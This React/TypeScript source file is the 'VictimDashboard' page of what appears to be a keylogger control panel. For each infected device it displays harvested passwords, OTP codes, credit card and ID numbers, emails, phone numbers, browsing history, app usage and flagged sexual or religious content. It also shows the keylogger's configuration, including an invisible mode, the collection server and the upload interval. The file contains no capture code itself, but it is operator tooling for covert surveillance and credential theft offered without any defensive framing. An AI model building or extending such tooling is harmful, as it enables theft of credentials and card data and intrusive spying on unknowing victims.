import { useState, useEffect } from 'react';
import { useParams, useNavigate, Link } from 'react-router-dom';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Badge } from '@/components/ui/badge';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Calendar } from '@/components/ui/calendar';
import { 
  ArrowLeft,
  Calendar as CalendarIcon,
  Clock,
  Type,
  Monitor,
  MapPin,
  User,
  Shield,
  CreditCard,
  Mail,
  Phone,
  Globe,
  DollarSign,
  AlertTriangle,
  FileText,
  Activity,
  Settings,
  Database
} from 'lucide-react';
import { useToast } from '@/hooks/use-toast';
import { ChartContainer } from '@/components/ui/chart';
import * as Recharts from 'recharts';

interface SystemInfo {
  os: string;
  arch: string;
  hostname: string;
  ip: string;
}

interface Victim {
  _id: string;
  deviceName: string;
  display_name?: string;
  registered_on: string;
  tags: string[];
  TypingSpeed: number;
  offensive_keywords: string[];
  Passwords: string[];
  OTP: string[];
  EmailAddresses: string[];
  PhoneNumbers: string[];
  IDNumbers: string[];
  CreditCardNumbers: string[];
  LocationReferences: string[];
  Names: string[];
  URLs: string[];
  dates: string[];
  ip_addresses: string[];
  monetary_amounts: string[];
  sexual_content: string[];
  religious_references: string[];
  total_sessions: number;
  last_seen: string;
  total_days_active: number;
  total_active_time: number;
  apps_used: Array<{
    appname: string;
    timespent: number;
  }>;
  notes?: string;
  location?: string;
  system_info: SystemInfo;
  config: {
    format: number;
    visible: boolean;
    boot_wait: boolean;
    mouse_ignore: boolean;
    serverName: string;
    resource: string;
    intervalMinutes: number;
    log_file_name: string;
    backend_port: number;
  };
}

export const VictimDashboard = () => {
  const { clientId } = useParams<{ clientId: string }>();
  const [victim, setVictim] = useState<Victim | null>(null);
  const [loading, setLoading] = useState(true);
  const navigate = useNavigate();
  const { toast } = useToast();

  useEffect(() => {
    if (clientId) {
      fetchVictimData();
    }
  }, [clientId]);

  const fetchVictimData = async () => {
    try {
      const response = await fetch(`http://localhost:8000/api/clients/${clientId}`, {
        headers: {
          'Authorization': `Bearer ${localStorage.getItem('token')}`
        }
      });
      
      if (response.ok) {
        const data = await response.json();
        setVictim(data);
      } else {
        throw new Error('Failed to fetch victim data');
      }
    } catch (error) {
      console.error('Error fetching victim data:', error);
      toast({
        title: "Error",
        description: "Failed to load victim data.",
        variant: "destructive"
      });
    } finally {
      setLoading(false);
    }
  };

  const formatDate = (dateString: string) => {
    return new Date(dateString).toLocaleDateString('en-US', {
      year: 'numeric',
      month: 'short',
      day: 'numeric',
      hour: '2-digit',
      minute: '2-digit'
    });
  };

  const formatDateOnly = (dateString: string) => {
    return new Date(dateString).toLocaleDateString('en-US', {
      year: 'numeric',
      month: 'short',
      day: 'numeric'
    });
  };

  if (loading) {
    return (
      <div className="flex items-center justify-center h-64">
        <div className="text-lg">Loading victim data...</div>
      </div>
    );
  }

  if (!victim) {
    return (
      <div className="text-center py-12">
        <User className="h-12 w-12 text-muted-foreground mx-auto mb-4" />
        <h3 className="text-lg font-medium text-muted-foreground mb-2">
          Victim not found
        </h3>
        <Button onClick={() => navigate('/')}>
          <ArrowLeft className="mr-2 h-4 w-4" />
          Back to Victims
        </Button>
      </div>
    );
  }

  return (
    <div className="space-y-6">
      {/* Sub Navigation Bar */}
      <div className="border-b border-border bg-card/50 backdrop-blur-sm">
        <div className="container mx-auto px-4 py-3">
          <div className="flex items-center justify-between">
            <div className="flex items-center space-x-4">
              <Button
                variant="ghost"
                onClick={() => navigate('/')}
                className="flex items-center space-x-2"
              >
                <ArrowLeft className="h-4 w-4" />
                <span>Back to Victims</span>
              </Button>
              <div className="h-6 w-px bg-border" />
              <div>
                <h2 className="text-lg font-semibold">
                  {victim.display_name || 'Unnamed Device'}
                </h2>
                <p className="text-sm text-muted-foreground">
                  {victim.deviceName}
                </p>
              </div>
            </div>
            <div className="flex items-center space-x-2">
              <Badge variant="outline">
                {victim.total_sessions || 0} Sessions
              </Badge>
              <Badge variant="secondary">
                {victim.TypingSpeed || 0} WPM
              </Badge>
            </div>
          </div>
        </div>
      </div>

      {/* Main Content */}
      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        {/* Left Column - Overview */}
        <div className="lg:col-span-1 space-y-6">
          {/* Basic Info Card */}
          <Card>
            <CardHeader>
              <CardTitle className="flex items-center space-x-2">
                <User className="h-5 w-5" />
                <span>Basic Information</span>
              </CardTitle>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="grid grid-cols-2 gap-4 text-sm">
                <div>
                  <p className="font-medium text-muted-foreground">First Contact</p>
                  <p>{formatDate(victim.registered_on)}</p>
                </div>
                <div>
                  <p className="font-medium text-muted-foreground">Last Seen</p>
                  <p>{victim.last_seen ? formatDate(victim.last_seen) : 'Never'}</p>
                </div>
                <div>
                  <p className="font-medium text-muted-foreground">Typing Speed</p>
                  <p>{victim.TypingSpeed || 0} WPM</p>
                </div>
                <div>
                  <p className="font-medium text-muted-foreground">Total Sessions</p>
                  <p>{victim.total_sessions || 0}</p>
                </div>
              </div>
              
              {victim.location && (
                <div>
                  <p className="font-medium text-muted-foreground text-sm">Location</p>
                  <p className="text-sm">{victim.location}</p>
                </div>
              )}
              
              {victim.tags && victim.tags.length > 0 && (
                <div>
                  <p className="font-medium text-muted-foreground text-sm mb-2">Tags</p>
                  <div className="flex flex-wrap gap-1">
                    {victim.tags.map((tag, index) => (
                      <Badge key={index} variant="outline" className="text-xs">
                        {tag}
                      </Badge>
                    ))}
                  </div>
                </div>
              )}
            </CardContent>
          </Card>

          {/* System Info Card */}
          <Card>
            <CardHeader>
              <CardTitle className="flex items-center space-x-2">
                <Settings className="h-5 w-5" />
                <span>System Information</span>
              </CardTitle>
            </CardHeader>
            <CardContent className="space-y-3 text-sm">
              <div>
                <p className="font-medium text-muted-foreground">Operating System</p>
                <p>{victim.system_info?.os || 'Unknown'}</p>
              </div>
              <div>
                <p className="font-medium text-muted-foreground">Architecture</p>
                <p>{victim.system_info?.arch || 'Unknown'}</p>
              </div>
              <div>
                <p className="font-medium text-muted-foreground">Hostname</p>
                <p>{victim.system_info?.hostname || 'Unknown'}</p>
              </div>
              <div>
                <p className="font-medium text-muted-foreground">IP Address</p>
                <p>{victim.system_info?.ip || 'Unknown'}</p>
              </div>
            </CardContent>
          </Card>
        </div>

        {/* Right Column - Detailed Data */}
        <div className="lg:col-span-2 flex flex-col gap-6">
          {/* Calendar Section */}
          {victim && (
            <div className="w-full">
              <Calendar
                mode="single"
                selected={undefined}
                highlightedDates={victim.dates?.map(dateStr => new Date(dateStr))}
                onSelect={(date) => {
                  if (date) {
                    const formatted = date.toISOString().split('T')[0];
                    navigate(`/${victim._id}/${formatted}`);
                  }
                }}
                className="mb-4 w-full"
              />
            </div>
          )}

          {/* App Usage Chart Section */}
          {victim && victim.apps_used && victim.apps_used.length > 0 && (
            <div className="w-full bg-card rounded-lg p-4 shadow mb-2">
              <h3 className="text-lg font-semibold mb-2">Application Usage</h3>
              <ChartContainer
                config={victim.apps_used.reduce((acc, app) => {
                  acc[app.appname] = {
                    label: app.appname,
                    color: '#6366f1', // Indigo-500
                  };
                  return acc;
                }, {} as Record<string, { label: string; color: string }>)}
                className="h-72"
              >
                <Recharts.BarChart
                  data={victim.apps_used}
                  layout="vertical"
                  margin={{ top: 10, right: 30, left: 40, bottom: 10 }}
                >
                  <Recharts.XAxis type="number" tick={{ fontSize: 12 }} label={{ value: 'Minutes', position: 'insideBottomRight', offset: -5 }} tickFormatter={(v) => Math.round(v / 1000 / 60)} />
                  <Recharts.YAxis dataKey="appname" type="category" width={120} tick={{ fontSize: 12 }} />
                  <Recharts.Bar dataKey="timespent" isAnimationActive fill="#6366f1" radius={[4, 4, 4, 4]} />
                  <Recharts.Tooltip formatter={(value) => `${Math.round((value as number) / 1000 / 60)} min`} />
                </Recharts.BarChart>
              </ChartContainer>
            </div>
          )}

          {/* Tabs Section */}
          <Tabs defaultValue="overview" className="space-y-4 flex-1 flex flex-col justify-end">
            <TabsList className="grid w-full grid-cols-7">
              <TabsTrigger value="overview">Overview</TabsTrigger>
              <TabsTrigger value="personal">Personal</TabsTrigger>
              <TabsTrigger value="financial">Financial</TabsTrigger>
              <TabsTrigger value="activity">Activity</TabsTrigger>
              <TabsTrigger value="content">Content</TabsTrigger>
              <TabsTrigger value="apps">Apps</TabsTrigger>
              <TabsTrigger value="config">Config</TabsTrigger>
            </TabsList>

            <TabsContent value="overview" className="space-y-4">
              <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
                <Card>
                  <CardContent className="p-4">
                    <div className="flex items-center space-x-2">
                      <Mail className="h-4 w-4 text-blue-500" />
                      <span className="text-sm font-medium">Emails</span>
                    </div>
                    <p className="text-2xl font-bold mt-2">
                      {victim.EmailAddresses?.length || 0}
                    </p>
                  </CardContent>
                </Card>
                
                <Card>
                  <CardContent className="p-4">
                    <div className="flex items-center space-x-2">
                      <Phone className="h-4 w-4 text-green-500" />
                      <span className="text-sm font-medium">Phone Numbers</span>
                    </div>
                    <p className="text-2xl font-bold mt-2">
                      {victim.PhoneNumbers?.length || 0}
                    </p>
                  </CardContent>
                </Card>
                
                <Card>
                  <CardContent className="p-4">
                    <div className="flex items-center space-x-2">
                      <CreditCard className="h-4 w-4 text-red-500" />
                      <span className="text-sm font-medium">Credit Cards</span>
                    </div>
                    <p className="text-2xl font-bold mt-2">
                      {victim.CreditCardNumbers?.length || 0}
                    </p>
                  </CardContent>
                </Card>
                
                <Card>
                  <CardContent className="p-4">
                    <div className="flex items-center space-x-2">
                      <Globe className="h-4 w-4 text-purple-500" />
                      <span className="text-sm font-medium">URLs</span>
                    </div>
                    <p className="text-2xl font-bold mt-2">
                      {victim.URLs?.length || 0}
                    </p>
                  </CardContent>
                </Card>
              </div>
            </TabsContent>

            <TabsContent value="personal" className="space-y-4">
              <Card>
                <CardHeader>
                  <CardTitle>Personal Information</CardTitle>
                </CardHeader>
                <CardContent className="space-y-4">
                  {victim.Names && victim.Names.length > 0 && (
                    <div>
                      <h4 className="font-medium mb-2">Names Found</h4>
                      <div className="flex flex-wrap gap-2">
                        {victim.Names.map((name, index) => (
                          <Badge key={index} variant="outline">
                            {name}
                          </Badge>
                        ))}
                      </div>
                    </div>
                  )}
                  
                  {victim.EmailAddresses && victim.EmailAddresses.length > 0 && (
                    <div>
                      <h4 className="font-medium mb-2">Email Addresses</h4>
                      <div className="flex flex-wrap gap-2">
                        {victim.EmailAddresses.map((email, index) => (
                          <Badge key={index} variant="outline">
                            {email}
                          </Badge>
                        ))}
                      </div>
                    </div>
                  )}
                  
                  {victim.PhoneNumbers && victim.PhoneNumbers.length > 0 && (
                    <div>
                      <h4 className="font-medium mb-2">Phone Numbers</h4>
                      <div className="flex flex-wrap gap-2">
                        {victim.PhoneNumbers.map((phone, index) => (
                          <Badge key={index} variant="outline">
                            {phone}
                          </Badge>
                        ))}
                      </div>
                    </div>
                  )}
                  
                  {victim.IDNumbers && victim.IDNumbers.length > 0 && (
                    <div>
                      <h4 className="font-medium mb-2">ID Numbers</h4>
                      <div className="flex flex-wrap gap-2">
                        {victim.IDNumbers.map((id, index) => (
                          <Badge key={index} variant="outline">
                            {id}
                          </Badge>
                        ))}
                      </div>
                    </div>
                  )}
                </CardContent>
              </Card>
            </TabsContent>

            <TabsContent value="financial" className="space-y-4">
              <Card>
                <CardHeader>
                  <CardTitle>Financial Information</CardTitle>
                </CardHeader>
                <CardContent className="space-y-4">
                  {victim.CreditCardNumbers && victim.CreditCardNumbers.length > 0 && (
                    <div>
                      <h4 className="font-medium mb-2">Credit Card Numbers</h4>
                      <div className="flex flex-wrap gap-2">
                        {victim.CreditCardNumbers.map((card, index) => (
                          <Badge key={index} variant="destructive">
                            {card}
                          </Badge>
                        ))}
                      </div>
                    </div>
                  )}
                  
                  {victim.monetary_amounts && victim.monetary_amounts.length > 0 && (
                    <div>
                      <h4 className="font-medium mb-2">Monetary Amounts</h4>
                      <div className="flex flex-wrap gap-2">
                        {victim.monetary_amounts.map((amount, index) => (
                          <Badge key={index} variant="outline">
                            {amount}
                          </Badge>
                        ))}
                      </div>
                    </div>
                  )}
                </CardContent>
              </Card>
            </TabsContent>

            <TabsContent value="activity" className="space-y-4">
              <Card>
                <CardHeader>
                  <CardTitle>Activity Data</CardTitle>
                </CardHeader>
                <CardContent className="space-y-4">
                  {victim.URLs && victim.URLs.length > 0 && (
                    <div>
                      <h4 className="font-medium mb-2">Visited URLs</h4>
                      <div className="space-y-2 max-h-40 overflow-y-auto">
                        {victim.URLs.map((url, index) => (
                          <div key={index} className="text-sm p-2 bg-muted rounded">
                            {url}
                          </div>
                        ))}
                      </div>
                    </div>
                  )}
                  
                  {victim.dates && victim.dates.length > 0 && (
                    <div>
                      <h4 className="font-medium mb-2">Important Dates</h4>
                      <div className="flex flex-wrap gap-2">
                        {victim.dates.map((date, index) => (
                          <Badge key={index} variant="outline">
                            {date}
                          </Badge>
                        ))}
                      </div>
                    </div>
                  )}
                </CardContent>
              </Card>
            </TabsContent>

            <TabsContent value="content" className="space-y-4">
              <Card>
                <CardHeader>
                  <CardTitle>Content Analysis</CardTitle>
                </CardHeader>
                <CardContent className="space-y-4">
                  {victim.offensive_keywords && victim.offensive_keywords.length > 0 && (
                    <div>
                      <h4 className="font-medium mb-2 text-red-600">Offensive Keywords</h4>
                      <div className="flex flex-wrap gap-2">
                        {victim.offensive_keywords.map((keyword, index) => (
                          <Badge key={index} variant="destructive">
                            {keyword}
                          </Badge>
                        ))}
                      </div>
                    </div>
                  )}
                  
                  {victim.sexual_content && victim.sexual_content.length > 0 && (
                    <div>
                      <h4 className="font-medium mb-2 text-orange-600">Sexual Content</h4>
                      <div className="flex flex-wrap gap-2">
                        {victim.sexual_content.map((content, index) => (
                          <Badge key={index} variant="destructive">
                            {content}
                          </Badge>
                        ))}
                      </div>
                    </div>
                  )}
                  
                  {victim.religious_references && victim.religious_references.length > 0 && (
                    <div>
                      <h4 className="font-medium mb-2">Religious References</h4>
                      <div className="flex flex-wrap gap-2">
                        {victim.religious_references.map((ref, index) => (
                          <Badge key={index} variant="outline">
                            {ref}
                          </Badge>
                        ))}
                      </div>
                    </div>
                  )}
                </CardContent>
              </Card>
            </TabsContent>

            <TabsContent value="apps" className="space-y-4">
              <Card>
                <CardHeader>
                  <CardTitle>Applications Used</CardTitle>
                  <CardDescription>
                    Applications and time spent on each
                  </CardDescription>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div>
                      <h4 className="font-medium mb-2">Total Active Time</h4>
                      <p className="text-2xl font-bold">
                        {victim.total_active_time ? Math.round(victim.total_active_time / 1000 / 60) : 0} minutes
                      </p>
                    </div>
                    <div>
                      <h4 className="font-medium mb-2">Total Days Active</h4>
                      <p className="text-2xl font-bold">
                        {victim.total_days_active || 0} days
                      </p>
                    </div>
                  </div>
                  
                  {victim.apps_used && victim.apps_used.length > 0 ? (
                    <div>
                      <h4 className="font-medium mb-2">Applications</h4>
                      <div className="space-y-2 max-h-60 overflow-y-auto">
                        {victim.apps_used
                          .sort((a, b) => b.timespent - a.timespent)
                          .map((app, index) => (
                            <div key={index} className="flex justify-between items-center p-2 bg-muted rounded">
                              <span className="font-medium">{app.appname}</span>
                              <span className="text-sm text-muted-foreground">
                                {Math.round(app.timespent / 1000 / 60)} minutes
                              </span>
                            </div>
                          ))}
                      </div>
                    </div>
                  ) : (
                    <div className="text-center py-4">
                      <p className="text-muted-foreground">No application data available</p>
                    </div>
                  )}
                </CardContent>
              </Card>
            </TabsContent>

            <TabsContent value="config" className="space-y-4">
              <Card>
                <CardHeader>
                  <CardTitle>Client Configuration</CardTitle>
                  <CardDescription>
                    Keylogger configuration settings
                  </CardDescription>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div>
                      <h4 className="font-medium mb-2">Format</h4>
                      <p className="text-sm text-muted-foreground">
                        {victim.config?.format === 0 ? 'Labels' : 
                         victim.config?.format === 10 ? 'Decimal' : 
                         victim.config?.format === 16 ? 'Hex' : 'Unknown'}
                      </p>
                    </div>
                    <div>
                      <h4 className="font-medium mb-2">Visibility</h4>
                      <p className="text-sm text-muted-foreground">
                        {victim.config?.visible ? 'Visible' : 'Invisible'}
                      </p>
                    </div>
                    <div>
                      <h4 className="font-medium mb-2">Boot Wait</h4>
                      <p className="text-sm text-muted-foreground">
                        {victim.config?.boot_wait ? 'Enabled' : 'Disabled'}
                      </p>
                    </div>
                    <div>
                      <h4 className="font-medium mb-2">Mouse Ignore</h4>
                      <p className="text-sm text-muted-foreground">
                        {victim.config?.mouse_ignore ? 'Enabled' : 'Disabled'}
                      </p>
                    </div>
                    <div>
                      <h4 className="font-medium mb-2">Server</h4>
                      <p className="text-sm text-muted-foreground">
                        {victim.config?.serverName}:{victim.config?.backend_port}
                      </p>
                    </div>
                    <div>
                      <h4 className="font-medium mb-2">Resource</h4>
                      <p className="text-sm text-muted-foreground">
                        {victim.config?.resource}
                      </p>
                    </div>
                    <div>
                      <h4 className="font-medium mb-2">Interval</h4>
                      <p className="text-sm text-muted-foreground">
                        {victim.config?.intervalMinutes} minutes
                      </p>
                    </div>
                    <div>
                      <h4 className="font-medium mb-2">Log File</h4>
                      <p className="text-sm text-muted-foreground">
                        {victim.config?.log_file_name}
                      </p>
                    </div>
                  </div>
                </CardContent>
              </Card>
            </TabsContent>
          </Tabs>
        </div>
      </div>
    </div>
  );
}; 